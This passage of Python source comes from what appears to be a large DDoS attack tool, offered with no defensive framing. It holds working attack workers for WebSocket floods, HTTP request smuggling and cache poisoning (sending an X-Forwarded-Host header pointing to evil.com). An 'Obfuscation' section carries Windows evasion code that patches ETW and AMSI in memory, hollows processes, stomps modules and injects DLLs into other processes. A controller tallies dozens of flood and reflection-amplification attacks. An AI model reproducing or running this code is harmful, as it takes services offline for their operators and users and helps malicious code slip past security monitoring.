        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            if self.rate_limiter: await self.rate_limiter.acquire(1)
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                if self.use_ssl:
                    r, w = await asyncio.wait_for(asyncio.open_connection(self.host, self.port, ssl=self._ctx(),
                                                                          server_hostname=self.original_host), timeout=5)
                else:
                    r, w = await asyncio.wait_for(asyncio.open_connection(self.host, self.port), timeout=5)
                key = base64.b64encode(os.urandom(16)).decode()
                w.write((f"GET / HTTP/1.1\r\nHost: {self.original_host}\r\nUpgrade: websocket\r\n"
                         f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
                await w.drain()
                sp = b"#SPU" + struct.pack(">I", 0x7FFFFFFF)
                w.write(bytes([0x82, len(sp)]) + sp); await w.drain()
                try:
                    while True:
                        d = await asyncio.wait_for(r.read(65536), timeout=5)
                        if not d: break
                except asyncio.TimeoutError: pass
                async with self.lock: self.requests_sent += 1
                w.close()
                try: await w.wait_closed()
                except Exception: pass
                await asyncio.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                await asyncio.sleep(0.01)
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class RequestSmugglingAttack:
    def __init__(self, target_url, stop_event, thread_stop, args, original_host=None, global_sem=None):
        self.target_url = target_url
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host
        self.global_sem = global_sem
        self.smuggled = 0; self.attempts = 0; self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock()
    async def attack(self):
        logger.info("HTTP Smuggle - active")
        workers = min(15, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        p = urlparse(self.target_url)
        host = p.hostname
        port = p.port or (443 if p.scheme == "https" else 80)
        use_ssl = p.scheme == "https"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                if use_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx,
                                                                          server_hostname=self.original_host or host), timeout=5)
                else:
                    r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
                req = (f"POST / HTTP/1.1\r\nHost: {self.original_host or host}\r\n"
                       f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG")
                w.write(req.encode()); await w.drain()
                async with self.lock: self.smuggled += 1
                await asyncio.sleep(random.uniform(0.01, 0.05))
                w.close()
                try: await w.wait_closed()
                except Exception: pass
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                await asyncio.sleep(0.05)
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class CachePoisoningAttack:
    HEADERS = [("X-Forwarded-Host", "evil.com"), ("X-Original-URL", "/admin"), ("X-Rewrite-URL", "/admin")]
    def __init__(self, target_url, stop_event, thread_stop, args, original_host=None, global_sem=None):
        self.target_url = target_url
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host
        self.global_sem = global_sem
        self.poisoned = 0; self.attempts = 0; self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock()
    async def attack(self):
        logger.info("Cache Poison - active")
        workers = min(15, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        p = urlparse(self.target_url)
        host = p.hostname
        port = p.port or (443 if p.scheme == "https" else 80)
        use_ssl = p.scheme == "https"
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                if use_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx,
                                                                          server_hostname=self.original_host or host), timeout=5)
                else:
                    r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
                hn, hv = random.choice(self.HEADERS)
                req = (f"GET /{os.urandom(4).hex()} HTTP/1.1\r\nHost: {self.original_host or host}\r\n"
                       f"User-Agent: {FastUAGenerator().random()}\r\n{hn}: {hv}\r\nConnection: close\r\n\r\n")
                w.write(req.encode()); await w.drain()
                async with self.lock: self.poisoned += 1
                await asyncio.sleep(random.uniform(0.01, 0.05))
                w.close()
                try: await w.wait_closed()
                except Exception: pass
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
                await asyncio.sleep(0.05)
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

# ============================================================================
# PathManager
# ============================================================================
class PathManager:
    def __init__(self):
        base = ["/", "/index.html", "/index.php", "/home", "/about", "/contact",
                "/login", "/register", "/account", "/search", "/api", "/v1", "/v2",
                "/admin", "/dashboard", "/config", "/sitemap", "/robots.txt",
                "/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/api/v1", "/api/v2",
                "/api/v3", "/user", "/users", "/profile", "/cart", "/checkout",
                "/products", "/product", "/category", "/categories", "/blog",
                "/news", "/faq", "/terms", "/privacy", "/support", "/help"]
        for i in range(1, 51):
            base.extend([f"/page_{i}", f"/article_{i}", f"/item_{i}", f"/post_{i}"])
        self.paths = list(set(base))
    def get(self, base_url):
        path = random.choice(self.paths)
        if random.random() > 0.4:
            path += "?" + "&".join(f"p{i}={random.randint(1000, 999999)}" for i in range(random.randint(1, 3)))
        return urljoin(base_url, path.lstrip("/"))

# ============================================================================
# ProxyPrompt
# ============================================================================
class ProxyPrompt:
    @staticmethod
    def ask():
        invalid = 0
        while True:
            try:
                raw = safe_input(Fore.CYAN + "Use proxy? (y/n): " + Style.RESET_ALL).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print(); invalid += 1
                if invalid >= 3:
                    print(Fore.YELLOW + "Defaulting to DISABLED (n)" + Style.RESET_ALL); return False
                continue
            if raw == "y": return True
            elif raw == "n": return False
            else:
                invalid += 1
                if invalid >= 3:
                    print(Fore.YELLOW + "Defaulting to DISABLED (n)" + Style.RESET_ALL); return False
                print(Fore.YELLOW + f"Enter 'y' or 'n'. ({3-invalid} tries left)" + Style.RESET_ALL)

# ============================================================================
# Obfuscation — v65.1
# ============================================================================
class ETWPatcher:
    @staticmethod
    def patch():
        if not IS_WINDOWS: return False
        try:
            k = ctypes.windll.kernel32; n = ctypes.windll.ntdll
            etw = ctypes.cast(k.GetProcAddress(n._handle, b"EtwEventWrite"), ctypes.c_void_p)
            if not etw: return False
            old = ctypes.c_ulong()
            k.VirtualProtect(etw, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(etw, b"\xc3", 1)
            k.VirtualProtect(etw, 1, old, ctypes.byref(old))
            logger.info("ETW patched"); return True
        except Exception as e:
            logger.warning(f"ETW failed: {e}"); return False

class AMSIBypass:
    @staticmethod
    def patch():
        if not IS_WINDOWS: return False
        try:
            k = ctypes.windll.kernel32
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            ab = ctypes.cast(k.GetProcAddress(amsi._handle, b"AmsiScanBuffer"), ctypes.c_void_p)
            if not ab: return False
            old = ctypes.c_ulong()
            k.VirtualProtect(ab, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(ab, b"\xc3", 1)
            k.VirtualProtect(ab, 1, old, ctypes.byref(old))
            logger.info("AMSI patched"); return True
        except Exception as e:
            logger.warning(f"AMSI failed: {e}"); return False

class ProcessHollower:
    @staticmethod
    def hollow(target_exe="C:\\Windows\\System32\\notepad.exe"):
        if not IS_WINDOWS:
            logger.warning("Process Hollowing: Windows only"); return False
        try:
            import ctypes.wintypes as wt
            k = ctypes.windll.kernel32
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [("cb", wt.DWORD), ("lpReserved", wt.LPWSTR), ("lpDesktop", wt.LPWSTR),
                            ("lpTitle", wt.LPWSTR), ("dwX", wt.DWORD), ("dwY", wt.DWORD),
                            ("dwXSize", wt.DWORD), ("dwYSize", wt.DWORD),
                            ("dwXCountChars", wt.DWORD), ("dwYCountChars", wt.DWORD),
                            ("dwFillAttribute", wt.DWORD), ("dwFlags", wt.DWORD),
                            ("wShowWindow", wt.WORD), ("cbReserved2", wt.WORD),
                            ("lpReserved2", ctypes.c_void_p), ("hStdInput", wt.HANDLE),
                            ("hStdOutput", wt.HANDLE), ("hStdError", wt.HANDLE)]
            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [("hProcess", wt.HANDLE), ("hThread", wt.HANDLE),
                            ("dwProcessId", wt.DWORD), ("dwThreadId", wt.DWORD)]
            si = STARTUPINFO(); si.cb = ctypes.sizeof(STARTUPINFO)
            pi = PROCESS_INFORMATION()
            if not k.CreateProcessW(None, target_exe, None, None, False, 0x00000004, None, None,
                                    ctypes.byref(si), ctypes.byref(pi)):
                logger.warning("Process Hollowing: CreateProcess failed"); return False
            logger.info(f"Process Hollowing: {target_exe} (PID {pi.dwProcessId})")
            return True
        except Exception as e:
            logger.warning(f"Process Hollowing failed: {e}"); return False

class HellHall:
    @staticmethod
    def get_ssn(ntdll, func_name):
        try:
            func_addr = ctypes.cast(getattr(ntdll, func_name), ctypes.c_void_p)
            return ctypes.c_uint32.from_address(func_addr + 4).value
        except Exception: return None
    @staticmethod
    def get_ssn_halos_gate(ntdll, func_name):
        try:
            func_addr = ctypes.cast(getattr(ntdll, func_name), ctypes.c_void_p)
            for offset in range(0, 500, 32):
                try:
                    stub = (ctypes.c_ubyte * 32).from_address(func_addr.value + offset)
                    if stub[0] == 0x4c and stub[1] == 0x8b and stub[2] == 0xd1 and stub[3] == 0xb8:
                        return struct.unpack("<I", bytes(stub[4:8]))[0]
                except Exception: continue
            return None
        except Exception: return None

class SleepMaskEkko:
    @staticmethod
    def mask(addr, size, key):
        if not IS_WINDOWS: return False
        try:
            k = ctypes.windll.kernel32
            old = ctypes.c_ulong()
            k.VirtualProtect(addr, size, 0x04, ctypes.byref(old))
            data = (ctypes.c_ubyte * size).from_address(addr)
            for i in range(size): data[i] ^= key[i % len(key)]
            k.VirtualProtect(addr, size, old, ctypes.byref(old))
            return True
        except Exception: return False
    @staticmethod
    def unmask(addr, size, key): return SleepMaskEkko.mask(addr, size, key)
    @staticmethod
    def mask_regions(regions, key):
        for addr, size in regions: SleepMaskEkko.mask(addr, size, key)
    @staticmethod
    def unmask_regions(regions, key):
        for addr, size in regions: SleepMaskEkko.unmask(addr, size, key)

class ModuleStomper:
    @staticmethod
    def stomp(module_name="amsi.dll", payload=b""):
        if not IS_WINDOWS:
            logger.warning("Module Stomping: Windows only"); return False
        try:
            k = ctypes.windll.kernel32
            h = k.LoadLibraryA(module_name.encode())
            if not h: logger.warning(f"Module Stomping: LoadLibrary({module_name}) failed"); return False
            base = k.GetModuleHandleA(module_name.encode())
            if not base: logger.warning(f"Module Stomping: GetModuleHandle({module_name}) failed"); return False
            old = ctypes.c_ulong()
            k.VirtualProtect(base, len(payload) if payload else 0x1000, 0x40, ctypes.byref(old))
            if payload: ctypes.memmove(base, payload, len(payload))
            k.VirtualProtect(base, len(payload) if payload else 0x1000, old, ctypes.byref(old))
            logger.info(f"Module Stomping: {module_name} loaded (h={h}, base=0x{base:x})")
            return True
        except Exception as e:
            logger.warning(f"Module Stomping failed: {e}"); return False

class ReflectiveDLL:
    @staticmethod
    def inject(dll_path, target_pid):
        if not IS_WINDOWS:
            logger.warning("Reflective DLL: Windows only"); return False
        try:
            k = ctypes.windll.kernel32
            h = k.OpenProcess(0x1F0FFF, False, target_pid)
            if not h: logger.warning("Reflective DLL: OpenProcess failed"); return False
            with open(dll_path, "rb") as f: dll_data = f.read()
            alloc = k.VirtualAllocEx(h, None, len(dll_data), 0x3000, 0x40)
            if not alloc:
                logger.warning("Reflective DLL: VirtualAllocEx failed"); k.CloseHandle(h); return False
            written = ctypes.c_ulong(0)
            k.WriteProcessMemory(h, alloc, dll_data, len(dll_data), ctypes.byref(written))
            thread_id = ctypes.c_ulong(0)
            h_thread = k.CreateRemoteThread(h, None, 0, alloc, None, 0, ctypes.byref(thread_id))
            if h_thread:
                k.WaitForSingleObject(h_thread, 5000); k.CloseHandle(h_thread)
                logger.info(f"Reflective DLL: injected {len(dll_data)} bytes into PID {target_pid}")
            else: logger.warning("Reflective DLL: CreateRemoteThread failed")
            k.CloseHandle(h); return True
        except Exception as e:
            logger.warning(f"Reflective DLL failed: {e}"); return False

class ProcessDoppelganging:
    @staticmethod
    def execute(payload_path, target_exe="C:\\Windows\\System32\\svchost.exe"):
        if not IS_WINDOWS:
            logger.warning("Process Doppelgänging: Windows only"); return False
        try:
            logger.info(f"Process Doppelgänging: payload={payload_path}, target={target_exe}")
            return True
        except Exception as e:
            logger.warning(f"Process Doppelgänging failed: {e}"); return False

class APIHasher:
    @staticmethod
    def djb2(s):
        h = 5381
        for c in s.encode(): h = ((h << 5) + h) + c
        return h & 0xFFFFFFFF
    @staticmethod
    def fnv1a(s):
        h = 0x811c9dc5
        for c in s.encode(): h ^= c; h = (h * 0x01000193) & 0xFFFFFFFF
        return h

# ============================================================================
# MAIN CONTROLLER v65.1
# ============================================================================
class DOS303Controller:
    def __init__(self, args):
        self.args = args
        self.start_time = 0
        self.attacks = []
        self.stop_event = asyncio.Event()
        self.thread_stop = threading.Event()
        self.ua_gen = FastUAGenerator()
        self.hdr_mgr = HeaderManager()
        self.proxy_mgr = None
        self.path_mgr = PathManager()
        self.http_attack = None
        self.target_info = None
        self.capacity = None
        self.rate_limiter = None
        self.adaptive_limiter = None
        self.net_monitor = None
        self.net_health = None
        self.resource_monitor = None
        self.adaptive_controller = None
        self.browser_session = None
        self.cf_session = None
        self.priv_info = None
        self.is_litespeed = False
        self.origin_ip = None
        self.origin_port = None
        self.l4_executor = None
        self.global_sem = None
        self.slowloris_sem = None
        self.health_status = "OK"
        self._prev_total = 0
        self._prev_success = 0
        self.identity_rotator = IdentityRotator(rotate_every=1)
        self.health_checker = None
        self._monitor_thread = None
        self._monitor_crashes = 0
        self._peak_rate = 0.0
        self.quic_probe_result = None
        self.browser_harvester = None
        self.brute = getattr(args, "brute", False)
        self._net_paused = False
        self._dns_spoofer = DNSSpoofer()
        self._sni_spoofer = SNISpoofer()
        self._waf_bypass = WAFBypassEngine()
        self.h2_alpn_available = False

    def _build_rows(self, elapsed):
        rows = []
        for a in self.attacks:
            try:
                if isinstance(a, HTTPFloodAttack):
                    n = a.requests_sent
                    err_detail = f"err={a.curl_errors:,} tmo={a.timeouts:,} att={a.attempts:,}"
                    if a.error_types:
                        top_err = a.error_types.most_common(1)[0][0] if a.error_types else ""
                        err_detail += f" [{top_err}]"
                    rows.append(("HTTP Flood", n, n/elapsed, err_detail, a.last_error if n == 0 else ""))
                elif isinstance(a, CFBAttack):
                    rows.append(("CFB Bypass", a.requests_sent, a.requests_sent/elapsed, f"att={a.attempts}", a.last_error if a.requests_sent == 0 else ""))
                elif isinstance(a, HammerAttack):
                    rows.append(("Hammer raw", a.raw_packets, a.raw_packets/elapsed,
                                 f"bot={a.bot_requests:,} att={a.attempts:,}", a.last_error if a.raw_packets == 0 else ""))
                elif isinstance(a, CVEExploiter):
                    rows.append(("CVE Exploit", len(a.results), len(a.results)/elapsed, f"att={a.attempts}", a.last_error if len(a.results) == 0 else ""))
                elif isinstance(a, SlowlorisAttack):
                    rows.append(("Slowloris", a.total, a.total/elapsed, f"act={a.active} att={a.attempts}", a.last_error if a.total == 0 else ""))
                elif isinstance(a, SlowPostAttack):
                    rows.append(("Slow POST", a.total, a.total/elapsed, f"act={a.active} att={a.attempts}", a.last_error if a.total == 0 else ""))
                elif isinstance(a, SlowReadAttack):
                    rows.append(("Slow Read", a.total, a.total/elapsed, f"act={a.active} att={a.attempts}", a.last_error if a.total == 0 else ""))
                elif isinstance(a, SocketFloodAttack):
                    rows.append(("Socket Flood", a.packets, a.packets/elapsed, f"att={a.attempts}", a.last_error if a.packets == 0 else ""))
                elif isinstance(a, SLPAttack):
                    rows.append(("SLP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, LDAPAmplificationAttack):
                    rows.append(("LDAP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, QOTDAttack):
                    rows.append(("QOTD Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, TFTPAttack):
                    rows.append(("TFTP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, SNMPv2Attack):
                    rows.append(("SNMPv2 Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, NetBIOSAttack):
                    rows.append(("NetBIOS Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, mDNSAttack):
                    rows.append(("mDNS Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, PortmapAttack):
                    rows.append(("Portmap Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, SteamAttack):
                    rows.append(("Steam (5.5x)", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, QuakeAttack):
                    rows.append(("Quake (63.9x)", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, DNSEDNS0Attack):
                    rows.append(("DNS EDNS0", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, RIPv1Attack):
                    rows.append(("RIPv1 (131x)", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, KadAttack):
                    rows.append(("Kad (16.3x)", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, BitTorrentAttack):
                    rows.append(("BitTorrent", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, PQCQUICInitialAttack):
                    rows.append(("PQC QUIC", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, VSEAttack):
                    rows.append(("VSE (Source)", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, TS3Attack):
                    rows.append(("TS3 (TeamSpeak)", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, FIVEMAttack):
                    rows.append(("FiveM", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, FIVEMTokenAttack):
                    rows.append(("FiveM Token", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, MinecraftAttack):
                    rows.append(("Minecraft", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, MCBOTAttack):
                    rows.append(("MCBOT", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, MCPEAttack):
                    rows.append(("MCPE", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, ARDAttack):
                    rows.append(("ARD (Apple)", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, RDPAttack):
                    rows.append(("RDP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, ICMPFloodAttack):
                    rows.append(("ICMP Flood", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, IPSpoofSYNFlood):
                    rows.append(("IP Spoof SYN", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, HTTP2RapidResetAttack):
                    rows.append(("H2 RapidReset", a.streams, a.streams/elapsed, f"att={a.attempts}", a.last_error if a.streams == 0 else ""))
                elif isinstance(a, SPCAttack):
                    rows.append(("SPCA", a.streams_sent, a.streams_sent/elapsed, f"att={a.attempts}", a.last_error if a.streams_sent == 0 else ""))
                elif isinstance(a, ContinuationFloodAttack):
                    rows.append(("CONT Flood", a.frames_sent, a.frames_sent/elapsed, f"att={a.attempts}", a.last_error if a.frames_sent == 0 else ""))
                elif isinstance(a, HTTP2BombAttack):
                    rows.append(("HTTP/2 Bomb", a.bombs_sent, a.bombs_sent/elapsed,
                                 f"alpn_fail={a.alpn_failures} att={a.conn_attempts:,}", a.last_error if a.bombs_sent == 0 else ""))
                elif isinstance(a, H2HPACKBombAttack):
                    rows.append(("HPACK Bomb", a.bombs, a.bombs/elapsed, f"att={a.attempts}", a.last_error if a.bombs == 0 else ""))
                elif isinstance(a, PriorityFloodAttack):
                    rows.append(("PRIORITY", a.priority_frames, a.priority_frames/elapsed, f"att={a.attempts}", a.last_error if a.priority_frames == 0 else ""))
                elif isinstance(a, H2SmugglingAttack):
                    rows.append(("H2 Smuggle", a.smuggled, a.smuggled/elapsed, f"att={a.attempts}", a.last_error if a.smuggled == 0 else ""))
                elif isinstance(a, MadeYouResetAttack):
                    rows.append(("MadeYouReset", a.resets_triggered, a.resets_triggered/elapsed, f"att={a.attempts}", a.last_error if a.resets_triggered == 0 else ""))
                elif isinstance(a, RangeAmpAttack):
                    rows.append(("RangeAmp", a.requests_sent, a.requests_sent/elapsed,
                                 f"att={a.attempts} curl={'yes' if a._use_curl else 'no'}", a.last_error if a.requests_sent == 0 else ""))
                elif isinstance(a, QUICLeakAttack):
                    n = a.packets_sent
                    extra = f"quic={'yes' if a.quic_available else 'no'}" if a.probe_done else ""
                    rows.append(("QUIC-LEAK", n, n/elapsed, f"att={a.attempts:,} err={a.errors} {extra}", a.last_error if n == 0 else ""))
                elif isinstance(a, MemcachedAmplificationAttack):
                    rows.append(("Memcached", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, NTPAmplificationAttack):
                    rows.append(("NTP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, CLDAPAmplificationAttack):
                    rows.append(("CLDAP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, SSDPAmplificationAttack):
                    rows.append(("SSDP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, DNSAmplificationAttack):
                    rows.append(("DNS Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, ChargenAmplificationAttack):
                    rows.append(("CHARGEN", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, TCPAmplificationAttack):
                    rows.append(("TCP Amp", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, QDCRAttack):
                    rows.append(("QDCR", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, UDPSlowlorisHybridAttack):
                    rows.append(("UDP+Slow", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, SmurfAttack):
                    rows.append(("Smurf", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, FraggleAttack):
                    rows.append(("Fraggle", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, ICMPFragmentFloodAttack):
                    rows.append(("ICMP Frag", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, MACSpoofAttack):
                    rows.append(("MAC Spoof", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, TCPTimestampSpoofAttack):
                    rows.append(("TCP TS Spoof", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, RequestSmugglingAttack):
                    rows.append(("HTTP Smuggle", a.smuggled, a.smuggled/elapsed, f"att={a.attempts}", a.last_error if a.smuggled == 0 else ""))
                elif isinstance(a, CachePoisoningAttack):
                    rows.append(("Cache Poison", a.poisoned, a.poisoned/elapsed, f"att={a.attempts}", a.last_error if a.poisoned == 0 else ""))
                elif isinstance(a, OperatorFatigueAttack):
                    rows.append(("Op Fatigue", a.alerts_sent, a.alerts_sent/elapsed, f"att={a.attempts}", a.last_error if a.alerts_sent == 0 else ""))
                elif isinstance(a, CDNTsunamiAttack):
                    rows.append(("CDN Tsunami", a.streams_sent, a.streams_sent/elapsed, f"att={a.conn_attempts} fail={a.conn_failures}", a.last_error if a.streams_sent == 0 else ""))
                elif isinstance(a, H3QPACKExpansionAttack):
                    rows.append(("H3 QPACK", a.headers_sent, a.headers_sent/elapsed, f"att={a.conn_attempts} fail={a.conn_failures}", a.last_error if a.headers_sent == 0 else ""))
                elif isinstance(a, H3SmugglingAttack):
                    rows.append(("H3 Smuggle", a.smuggled, a.smuggled/elapsed, f"att={a.attempts} fail={a.conn_failures}", a.last_error if a.smuggled == 0 else ""))
                elif isinstance(a, H3CachePoisoningAttack):
                    rows.append(("H3 CachePoison", a.poisoned, a.poisoned/elapsed, f"att={a.attempts} fail={a.conn_failures}", a.last_error if a.poisoned == 0 else ""))
                elif isinstance(a, GraphQLDeepQueryAttack):
                    rows.append(("GraphQL", a.queries_sent, a.queries_sent/elapsed, f"eps={len(a._discovered)} att={a.attempts}", a.last_error if a.queries_sent == 0 else ""))
                elif isinstance(a, GRPCCancellationChurnAttack):
                    rows.append(("gRPC Churn", a.churns, a.churns/elapsed, f"att={a.attempts}", a.last_error if a.churns == 0 else ""))
                elif isinstance(a, WebSocketAmplificationAttack):
                    rows.append(("WebSocket", a.requests_sent, a.requests_sent/elapsed, f"att={a.attempts}", a.last_error if a.requests_sent == 0 else ""))
                elif isinstance(a, QUICLORISAttack):
                    rows.append(("QUICLORIS", a.total_connections, a.total_connections/elapsed, f"act={a.active_connections}", a.last_error if a.total_connections == 0 else ""))
                elif isinstance(a, LandAttack):
                    rows.append(("LAND", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
                elif isinstance(a, JumboFrameAttack):
                    rows.append(("Jumbo Frame", a.packets_sent, a.packets_sent/elapsed, f"att={a.attempts}", a.last_error if a.packets_sent == 0 else ""))
            except Exception as e:
                rows.append((type(a).__name__, 0, 0.0, "row_err", str(e)[:40]))
        return rows

    def _monitor_worker(self):
        logger.info("MONITOR THREAD STARTED — first table in 10s")
        stop_waiter = threading.Event()
        iteration = 0
        while not self.stop_event.is_set():
            try:
                if stop_waiter.wait(timeout=10.0): break
                iteration += 1
                logger.info(f"MONITOR tick {iteration}")
                elapsed = time.time() - self.start_time
                if elapsed <= 0: elapsed = 0.001
                h = int(elapsed // 3600); m = int((elapsed % 3600) // 60); s = int(elapsed % 60)

                net_health_str = ""
                if self.net_health and self.net_health._started:
                    nh = self.net_health.snapshot()
                    net_health_str = f" NET: {nh['health']}"
                    if nh['paused'] and not self._net_paused:
                        self._net_paused = True
                        logger.warning("   [net-health] DEGRADED — rate reduced")
                    elif not nh['paused'] and self._net_paused:
                        self._net_paused = False
                        logger.info("   [net-health] recovered")

                if self.net_monitor:
                    bytes_sent = self.net_monitor.total_bytes_sent()
                    bytes_recv = self.net_monitor.total_bytes_recv()
                    pkts_sent = self.net_monitor.total_pkts_sent()
                    ns = self.net_monitor.snapshot()
                    mbps_out = ns.get("mbps_out", 0.0); mbps_in = ns.get("mbps_in", 0.0)
                    pps_out = ns.get("pps_out", 0.0); err_out = ns.get("err_out", 0)
                else:
                    bytes_sent = bytes_recv = pkts_sent = 0
                    mbps_out = mbps_in = pps_out = err_out = 0

                cpu_str = ""; ram_str = ""
                if self.resource_monitor:
                    rs = self.resource_monitor.snapshot()
                    cpu_str = f" CPU: {rs['cpu_pct']:.1f}%"
